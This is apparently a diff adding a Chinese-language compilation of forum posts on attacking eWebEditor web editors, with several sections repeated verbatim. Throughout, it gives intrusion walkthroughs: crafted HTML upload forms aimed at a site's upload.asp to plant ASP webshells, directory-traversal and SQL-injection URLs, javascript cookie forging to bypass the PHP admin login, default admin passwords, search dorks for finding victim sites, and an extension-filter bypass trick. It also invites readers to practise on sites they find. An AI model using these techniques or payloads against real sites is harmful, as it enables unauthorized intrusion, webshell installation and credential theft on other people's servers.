@@ -1,0 +1,215 @@
+
+ewebeditor 5.5 - 6.0 漏洞
+
+我们构造这样一个页面
+http://www.xxxx.com/admin/ewebed ... up&cusdir=a.asp
+这样会在   网站目录下生产 a.asp这个文件夹
+然后再本地构造html
+<form action="http://www.xxxx.com/admin/ewebeditor/asp/upload.asp?action=savetype=image&style=popup&cusdir=a.asp" method=post name=myform enctype="multipart/form-data">
+<input type=file name=uploadfile size=100><br><br>
+<input type=submit value=upload>
+</form>
+
+然后打开 上传 一句话（jpg格式）
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+eWebEditor.asp?id=45&style=standard1 样式调用
+
+
+/edit/admin_uploadfile.asp?id=14&dir=../../..
+可以浏览网站目录  ../自己加或者减
+
+有次无意的入侵使我发现了ewebeditor2.7.0版本的存在注入漏洞
+简单利用就是
+http://site/path/ewebeditor/ewebeditor.asp?id=article_content&style=full_v200
+http://www.siqinci.com/ewebedito ... amp;style=full_v200
+可以利用nbsi进行猜解，对此进行注入
+还有的时候管理员不让复制样式，但是你又看到有个样式被别人以前入侵修改了存在asa或者之类可以传shell，但是上传插入工具没有，又无法修改怎么办那？也许很多人说应该可以加工具栏，但是我就遇见过不让加的
+这样我们可以利用ewebeditor里的upload.asp文件进行本地构造进行上传具体如下：
+在action下面
+<form action="http://*********/edit/upload.asp?action=save&type=ASA&style=test" method=post name=myform enctype="multipart/form-data">
+<input type=file name=uploadfile size=1 style="width:100%" onchange="originalfile.value=this.value">
+<input type="submit" name="uploadfile" value="提交">
+<input type=hidden name=originalfile value="">
+</form>
+------------------------------------------------------------------------------------------------------------------------------------------------
+<input type="submit" name="uploadfile" value="提交">    放在action后头
+，适合用于在ewebeditor后台那个预览那里出来的 比如上传图片那里，有些时候上传页面弹不出来，就可以用upload.asp?action=save&type=ASA&style=test 这个本地来提交，不过这个东西还是要数据库里上传类型有ASA才可以传得上。
+
+以下文章收集转载于网络:) 算是比较全面的ewebeditor编辑器的漏洞收集，现在的网站大多数用的都是ewebeditor编辑器，所以ewebeditor漏洞的危害性还是相当大的，做了一下漏洞收集，漏洞修补的方法可去网上查找。
+
+漏洞更新日期TM： 2009 2 9日 转自zake’S Blog
+        ewebeditor最新漏洞。这个程序爆漏洞一般都是直接上传的漏洞，首先在本地搭建一个ASP环境重命名一个木马名字例如：1.gif.asp这样的就OK了
+那么接下来完美本地搭建一个环境你可以用WEB小工具搭建一个，目的就是让远程上传。/pic/3/a2009-6-4-7341a1.gif.asp搭建好了 ，在官方的地方执行网络地址
+
+然后确定以后，这里是最关键的一部！
+这里点了远程上传以后，再提交得到木马地址
+
+由于官方在图片目录做了限制 导致不能执行ASP脚本而没能拿到WEB权限。
+
+
+Ewebeditor最新漏洞及漏洞大全[收集] (图)
+
+
+
+--------------------------------------------------------------------------------------------
+#内容#
+php版ewebeditor 3.8的漏洞
+php版本后台是调用../ewebeditor/admin/config.php,大家去看下源码就知道，在这里我说说利用方法:
+1 首先当然要找到登陆后台,默认是../eWebEditor/admin/login.php,进入后台后随便输入一个用户和密码,当然会提示出错了,必须是出错的时候，然后这时候你清空浏览器的url,然后输入 javascript:alert(document.cookie=”adminuser=”+escape(”admin”)); javascript:alert(document.cookie=”adminpass=”+escape(”admin”)); javascript:alert(document.cookie=”admindj=”+escape(”1″));后三次回车,
+2 然后输入正常情况才能访问的文件../ewebeditor/admin/default.php就可以进后台了
+3 后面的利用和asp一样,新增样式修改上传,就ok了
+测试一下asp 2.8版本的,竟然一样可以用,爽,看来asp版的应该可以通杀(只测试2.8的,貌似2.8是最高版本的)
+aspx的版本../ewebeditor/admin/upload.aspx添好本地的cer的Shell文件,在浏揽器输入javascript:lbtnUpload.click();就能得到shell
+jsp的上传漏洞以及那个出了N久了,由于没有上传按钮,选择好要上传的shell,直接回车就可以了
+--------------------------------------------------------------------------------------------
+
+
+算是比较全面的ewebeditor编辑器的漏洞收集，现在的网站大多数用的都是ewebeditor编辑器，所以ewebeditor漏洞的危害性还是相当大的，做了一下漏洞收集，漏洞修补的方法可去网上查找。
+
+漏洞更新日期TM： 2009 2 9日 转自zake’S Blog
+        ewebeditor最新漏洞。这个程序爆漏洞一般都是直接上传的漏洞，首先在本地搭建一个ASP环境重命名一个木马名字例如：1.gif.asp这样的就OK了
+那么接下来完美本地搭建一个环境你可以用WEB小工具搭建一个，目的就是让远程上传。/pic/3/a2009-6-4-7341a1.gif.asp搭建好了 ，在官方的地方执行网络地址
+
+
+然后确定以后，这里是最关键的一部！
+这里点了远程上传以后，再提交得到木马地址
+由于官方在图片目录做了限制 导致不能执行ASP脚本而没能拿到WEB权限
+属于安全检测漏洞版本ewebeditor v6.0.0
+
+以前的ewebeditor漏洞：
+
+ewebeditor注入漏洞
+
+大家都知道ewebeditor编辑器默认的数据库路径db/ewebeditor.mdb
+默认后台地址是admin_login.asp，另外存在遍历目录漏洞，如果是asp后缀的数据库还可以写入一句话
+今天我给大家带来的也是ewebeditor编辑器的入侵方法
+不过一种是注入，一种是利用upload.asp文件，本地构造
+NO1：注入
+http://www.XXX.com/ewebeditor200 ... amp;style=full_v200
+编辑器ewebedior7以前版本通通存在注入
+直接检测不行的，要写入特征字符
+我们的工具是不知道ewebeditor的表名的还有列名
+我们自己去看看
+哎。。先表吧
+要先添加进库
+开始猜账号密码了
+我们==
+心急的往后拉
+出来了
+[sys_username]:bfb18022a99849f5 chaoup[sys_userpass]:0ed08394302f7d5d 851120
+对吧^_^
+后面不说了
+NO2：利用upload.asp文件，本地构造上传shell
+大家看这里
+http://www.siqinci.com/ewebedito ... lepreview&id=37
+如果遇见这样的情况又无法添加工具栏是不是很郁闷
+现在不郁闷了，^_^源源不一般
+我们记录下他的样式名“aaa”
+我已经吧upload.asp文件拿出来了
+我们构造下
+OK，我之前已经构造好了
+其实就是这里
+<form action=”地址/path/upload.asp?action=save&type=&style=样式名” method=post name=myform enctype=”multipart/form-data”>
+<input type=file name=uploadfile size=1 style=”width:100%”>
+<input type=submit value=”上传了”></input>
+</form>
+下面我们运行他上传个大马算了
+UploadFile上传进去的在这个目录下
+2008102018020762.asa
+
+过往漏洞:
+
+首先介绍编辑器的一些默认特征:
+默认登陆admin_login.asp
+默认数据库db/ewebeditor.mdb
+默认帐号admin 密码admin或admin888
+搜索关键字:”inurl:ewebeditor” 关键字十分重要
+有人搜索”eWebEditor - eWebSoft在线编辑器”
+根本搜索不到几个~
+baidu.google搜索inurl:ewebeditor
+几万的站起码有几千个是具有默认特征的~
+那么试一下默认后台
+http://www.xxx.com.cn/admin/ewebeditor/admin_login.asp
+试默认帐号密码登陆。
+利用eWebEditor获得WebShell的步骤大致如下：
+1．确定网站使用了eWebEditor。一般来说，我们只要注意发表帖子（文章）的页面是否有类似做了记号的图标，就可以大致做出判断了。
+2．查看源代码，找到eWebEditor的路径。点击“查看源代码”，看看源码中是否存在类似“<iframe ID=’eWebEditor1′ src=’/edit/ewebeditor.asp?id=content&style=web’ frameborder=0 scrolling=no width=’550′ HEIGHT=’350′></iframe>”的语句。其实只有发现了存在这样的语句了，才可以真正确定这个网站使用了 eWebEditor。然后记下src=’***’中的“***”，这就是eWebEditor路径。
+3．访问eWebEditor的管理登录页面。eWebEditor的默认管理页面为admin_login.asp，和ewebeditor.asp在同一目录下。以上面的路径为例，我们访问的地址为：http://www.***.net/edit/admin_login.asp，看看是否出现了登录页面。
+如果没有看到这样的页面，说明管理员已经删除了管理登录页面，呵呵，还等什么，走人啊，换个地方试试。不过一般来说，我很少看到有哪个管理员删了这个页面，试试默认的用户名：admin，密码：admin888。怎么样？成功了吧（不是默认账户请看后文）！
+4．增加上传文件类型。点击“样式管理”，随便选择列表中底下的某一个样式的“设置，为什么要选择列表中底下的样式？因为eWebEditor自带的样式是不允许修改的，当然你也可以拷贝一个新的样式来设置。
+然后在上传的文件类型中增加“asa”类型。
+5．上传ASP木马，获得WebShell。接下来将ASP木马的扩展名修改为asa，就可以简单上传你的ASP木马了。不要问我怎么上传啊，看到 “预览” 了吗？点击“预览”，然后选择“插入其它文件”的按钮就可以了。
+漏洞原理
+漏洞的利用原理很简单，请看Upload.asp文件：
+任何情况下都不允许上传asp脚本文件
+sAllowExt = Replace(UCase(sAllowExt), “ASP”, “”)
+因为eWebEditor仅仅过滤了ASP文件。记得我第一次使用eWebEditor时就在纳闷：既然作者已经知道asp文件需要过滤，为什么不同时过滤asa、cer等文件呢？也许这就是对免费用户不负责任的表现吧！
+高级应用
+eWebEditor的漏洞利用还有一些技巧：
+1．使用默认用户名和密码无法登录。
+请试试直接下载db目录下的ewebeditor.mdb文件，用户名和密码在eWebEditor_System表中，经过了md5加密，如果无法下载或者无法破解，那就当自己的运气不好了。
+2．加了asa类型后发现还是无法上传。
+应该是站长懂点代码，自己修改了Upload.asp文件，但是没有关系，按照常人的思维习惯，往往会直接在sAllowExt = Replace(UCase(sAllowExt), “ASP”, “”)一句上修改，我就看见过一个站长是这样修改的：
+sAllowExt = Replace(Replace(Replace(Replace(Replace(UCase(sAllowExt), “ASP”, “”), “CER”, “”), “ASA”, “”), “CDX”, “”), “HTR”, “”)
+猛一看什么都过滤了，但是我们只要在上传类型中增加“aaspsp”，就可以直接上传asp文件了。呵呵，是不是天才的想法？“aaspsp”过滤了 “asp”字符后，反而变成了“asp”！顺便告诉大家一个秘密，其实动网论坛7.0 sp2中也可以利用类似的方法绕过对扩展名的过滤。
+3．上传了asp文件后，却发现该目录没有运行脚本的权限。
+呵呵，真是好笨啊，上传类型可以改，上传路径不是也可以修改的吗？仔细看看图四。
+4．已经使用了第2点中的方法，但是asp类型还是无法上传。
+看来站长肯定是一个写asp的高手，但是我们还有最后一招来对付他：看到图三中的“远程类型”了吗？eWebEditor能够设定自动保存远程文件的类型，我们可以加入asp类型。但是如何才能让远程访问的asp文件能够以源码形式保存呢？方法是很多的，最简单的方法是将IIS中的“应用文件映射”中的 “asp”删除。
+后记
+根据自己的经验，几乎只要能进入eWebEditor的后台管理，基本上都可以获得WebShell。在Google上搜索 “ewebeditor.asp?id=”能够看到长达十多页的相关信息，我大致抽查了其中几个，发现成功率约为50％。还不错吧？oblg 2.52版以前的版本也是使用eWebEditor，可以去搜索几个来练练手。要命的是eWebEditor的官方网站和帮助文件中根本没有这方面的安全提示。还有，我发现官方提供的测试系统并不存在类似的漏洞，看来不是他们不知道，而是没有把免费用户的网络安危放在心上！
+基本入侵基础漏洞
+eWebEditor 漏洞
+
+各位站长在使用eWebEditor的时候是否发现，eWebEditor配置不当会使其成为网站中的隐形炸弹呢？第一次发现这漏洞源于去年的一次入侵，在山穷水尽的时候发现了eWebEditor，于是很简单就获得了WebShell。后来又有好几次利用eWebEditor进行入侵的成功经历，这才想起应该写一篇文章和大家共享一下，同时也请广大已经使用了eWebEditor的站长赶紧检查一下自己的站点。要不然，下一个被黑的就是你哦！  
+
+漏洞利用
+利用eWebEditor获得WebShell的步骤大致如下：
+1．确定网站使用了eWebEditor。一般来说，我们只要注意发表帖子（文章）的页面是否有类似做了记号的图标，就可以大致做出判断了。
+2．查看源代码，找到eWebEditor的路径。点击“查看源代码”，看看源码中是否存在类似“<iframe ID='eWebEditor1' src='/edit/ewebeditor.asp?id=content&style=web' frameborder=0 scrolling=no width='550' HEIGHT='350'></iframe>”的语句。其实只有发现了存在这样的语句了，才可以真正确定这个网站使用了 eWebEditor。然后记下src='***'中的“***”，这就是eWebEditor路径。
+3．访问eWebEditor的管理登录页面。eWebEditor的默认管理页面为admin_login.asp，和ewebeditor.asp在同一目录下。以上面的路径为例，我们访问的地址为：http://www.***.net/edit/admin_login.asp，看看是否出现了登录页面。
+如果没有看到这样的页面，说明管理员已经删除了管理登录页面，呵呵，还等什么，走人啊，换个地方试试。不过一般来说，我很少看到有哪个管理员删了这个页面，试试默认的用户名：admin，密码：admin888。怎么样？成功了吧（不是默认账户请看后文）！
+4．增加上传文件类型。点击“样式管理”，随便选择列表中底下的某一个样式的“设置，为什么要选择列表中底下的样式？因为eWebEditor自带的样式是不允许修改的，当然你也可以拷贝一个新的样式来设置。
+
+然后在上传的文件类型中增加“asa”类型。
+
+5．上传ASP木马，获得WebShell。接下来将ASP木马的扩展名修改为asa，就可以简单上传你的ASP木马了。不要问我怎么上传啊，看到 “预览” 了吗？点击“预览”，然后选择“插入其它文件”的按钮就可以了。
+
+
+漏洞原理
+漏洞的利用原理很简单，请看Upload.asp文件：
+任何情况下都不允许上传asp脚本文件
+sAllowExt = replace(UCase(sAllowExt), "ASP", "")
+因为eWebEditor仅仅过滤了ASP文件。记得我第一次使用eWebEditor时就在纳闷：既然作者已经知道asp文件需要过滤，为什么不同时过滤asa、cer等文件呢？也许这就是对免费用户不负责任的表现吧！
+
+高级应用
+eWebEditor的漏洞利用还有一些技巧：
+1．使用默认用户名和密码无法登录。
+请试试直接下载db目录下的ewebeditor.mdb文件，用户名和密码在eWebEditor_System表中，经过了md5加密，如果无法下载或者无法****，那就当自己的运气不好了。
+2．加了asa类型后发现还是无法上传。
+应该是站长懂点代码，自己修改了Upload.asp文件，但是没有关系，按照常人的思维习惯，往往会直接在sAllowExt = replace(UCase(sAllowExt), "ASP", "")一句上修改，我就看见过一个站长是这样修改的：
+sAllowExt = replace(replace(replace(replace(replace(UCase(sAllowExt), "ASP", ""), "CER", ""), "ASA", ""), "CDX", ""), "HTR", "")
+猛一看什么都过滤了，但是我们只要在上传类型中增加“aaspsp”，就可以直接上传asp文件了。呵呵，是不是天才的想法？“aaspsp”过滤了 “asp”字符后，反而变成了“asp”！顺便告诉大家一个秘密，其实动网论坛7.0 sp2中也可以利用类似的方法绕过对扩展名的过滤。
+3．上传了asp文件后，却发现该目录没有运行脚本的权限。
+呵呵，真是好笨啊，上传类型可以改，上传路径不是也可以修改的吗？仔细看看图四。
+4．已经使用了第2点中的方法，但是asp类型还是无法上传。
+看来站长肯定是一个写asp的高手，但是我们还有最后一招来对付他：看到图三中的“远程类型”了吗？eWebEditor能够设定自动保存远程文件的类型，我们可以加入asp类型。但是如何才能让远程访问的asp文件能够以源码形式保存呢？方法是很多的，最简单的方法是将IIS中的“应用文件映射”中的 “asp”删除。
+
+后记
+根据自己的经验，几乎只要能进入eWebEditor的后台管理，基本上都可以获得WebShell。在Google上搜索 “ewebeditor.asp?id=”能够看到长达十多页的相关信息，我大致抽查了其中几个，发现成功率约为50％。还不错吧？oblg 2.52版以前的版本也是使用eWebEditor，可以去搜索几个来练练手。要命的是eWebEditor的官方网站和帮助文件中根本没有这方面的安全提示。还有，我发现官方提供的测试系统并不存在类似的漏洞，看来不是他们不知道，而是没有把免费用户的网络安危放在心上！
